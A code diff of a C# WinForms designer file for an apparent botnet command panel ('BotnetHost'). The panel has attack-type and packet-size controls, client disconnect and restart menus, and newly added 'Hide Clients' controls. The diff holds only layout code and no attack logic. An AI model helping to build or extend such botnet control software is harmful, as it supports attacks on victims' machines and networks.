@@ -30,6 +30,7 @@ namespace BotnetHost
         private void InitializeComponent()
         {
             this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainPanel));
             this.serverPortLabel = new MetroFramework.Controls.MetroLabel();
             this.serverIPLabel = new MetroFramework.Controls.MetroLabel();
             this.serverIPV4Label = new MetroFramework.Controls.MetroLabel();
@@ -68,6 +69,8 @@ namespace BotnetHost
             this.clientContextMenu = new MetroFramework.Controls.MetroContextMenu(this.components);
             this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.hideClientsBtn = new MetroFramework.Controls.MetroButton();
+            this.hideToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.metroPanel3.SuspendLayout();
             this.metroPanel1.SuspendLayout();
             this.logContextMenu.SuspendLayout();
@@ -145,6 +148,7 @@ namespace BotnetHost
             // metroPanel3
             // 
             this.metroPanel3.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.metroPanel3.Controls.Add(this.hideClientsBtn);
             this.metroPanel3.Controls.Add(this.packetSizeLabel);
             this.metroPanel3.Controls.Add(this.metroLabel13);
             this.metroPanel3.Controls.Add(this.packetSizeTrackBar);
@@ -210,7 +214,7 @@ namespace BotnetHost
             this.packetSizeTrackBar.Size = new System.Drawing.Size(136, 23);
             this.packetSizeTrackBar.TabIndex = 24;
             this.packetSizeTrackBar.Theme = MetroFramework.MetroThemeStyle.Dark;
-            this.packetSizeTrackBar.Value = 64;
+            this.packetSizeTrackBar.Value = 32;
             this.packetSizeTrackBar.ValueChanged += new System.EventHandler(this.updateTrackBars);
             // 
             // attackTypeComboBox
@@ -244,7 +248,7 @@ namespace BotnetHost
             // 
             // restartClientsBtn
             // 
-            this.restartClientsBtn.Location = new System.Drawing.Point(5, 401);
+            this.restartClientsBtn.Location = new System.Drawing.Point(5, 374);
             this.restartClientsBtn.Name = "restartClientsBtn";
             this.restartClientsBtn.Size = new System.Drawing.Size(130, 23);
             this.restartClientsBtn.TabIndex = 21;
@@ -255,9 +259,9 @@ namespace BotnetHost
             // 
             // applySettingsBtn
             // 
-            this.applySettingsBtn.Location = new System.Drawing.Point(151, 401);
+            this.applySettingsBtn.Location = new System.Drawing.Point(5, 403);
             this.applySettingsBtn.Name = "applySettingsBtn";
-            this.applySettingsBtn.Size = new System.Drawing.Size(130, 23);
+            this.applySettingsBtn.Size = new System.Drawing.Size(276, 23);
             this.applySettingsBtn.TabIndex = 20;
             this.applySettingsBtn.Text = "Apply Settings";
             this.applySettingsBtn.Theme = MetroFramework.MetroThemeStyle.Dark;
@@ -583,23 +587,42 @@ namespace BotnetHost
             // 
             this.clientContextMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.disconnectToolStripMenuItem,
-            this.restartToolStripMenuItem});
+            this.restartToolStripMenuItem,
+            this.hideToolStripMenuItem});
             this.clientContextMenu.Name = "clientContextMenu";
-            this.clientContextMenu.Size = new System.Drawing.Size(134, 48);
+            this.clientContextMenu.Size = new System.Drawing.Size(172, 70);
             // 
             // disconnectToolStripMenuItem
             // 
             this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
-            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
+            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
             this.disconnectToolStripMenuItem.Text = "Disconnect";
             this.disconnectToolStripMenuItem.Click += new System.EventHandler(this.disconnectToolStripMenuItem_Click);
             // 
             // restartToolStripMenuItem
             // 
             this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
-            this.restartToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
+            this.restartToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
             this.restartToolStripMenuItem.Text = "Restart";
             this.restartToolStripMenuItem.Click += new System.EventHandler(this.restartToolStripMenuItem_Click);
+            // 
+            // hideClientsBtn
+            // 
+            this.hideClientsBtn.Location = new System.Drawing.Point(151, 374);
+            this.hideClientsBtn.Name = "hideClientsBtn";
+            this.hideClientsBtn.Size = new System.Drawing.Size(130, 23);
+            this.hideClientsBtn.TabIndex = 27;
+            this.hideClientsBtn.Text = "Hide Clients";
+            this.hideClientsBtn.Theme = MetroFramework.MetroThemeStyle.Dark;
+            this.hideClientsBtn.UseSelectable = true;
+            this.hideClientsBtn.Click += new System.EventHandler(this.hideClientsBtn_Click);
+            // 
+            // hideToolStripMenuItem
+            // 
+            this.hideToolStripMenuItem.Name = "hideToolStripMenuItem";
+            this.hideToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
+            this.hideToolStripMenuItem.Text = "Toggle Show/Hide";
+            this.hideToolStripMenuItem.Click += new System.EventHandler(this.hideToolStripMenuItem_Click);
             // 
             // MainPanel
             // 
@@ -609,12 +632,12 @@ namespace BotnetHost
             this.ClientSize = new System.Drawing.Size(991, 549);
             this.Controls.Add(this.metroPanel1);
             this.DisplayHeader = false;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.Name = "MainPanel";
             this.Padding = new System.Windows.Forms.Padding(20, 30, 20, 20);
             this.Resizable = false;
             this.RightToLeft = System.Windows.Forms.RightToLeft.No;
             this.ShadowType = MetroFramework.Forms.MetroFormShadowType.AeroShadow;
-            this.Text = "Host Panel";
             this.Theme = MetroFramework.MetroThemeStyle.Dark;
             this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MainPanel_FormClosing);
             this.metroPanel3.ResumeLayout(false);
@@ -664,6 +687,8 @@ namespace BotnetHost
         private MetroFramework.Controls.MetroLabel packetSizeLabel;
         private MetroFramework.Controls.MetroLabel metroLabel13;
         private MetroFramework.Controls.MetroTrackBar packetSizeTrackBar;
+        private MetroFramework.Controls.MetroButton hideClientsBtn;
+        private System.Windows.Forms.ToolStripMenuItem hideToolStripMenuItem;
     }
 }
 
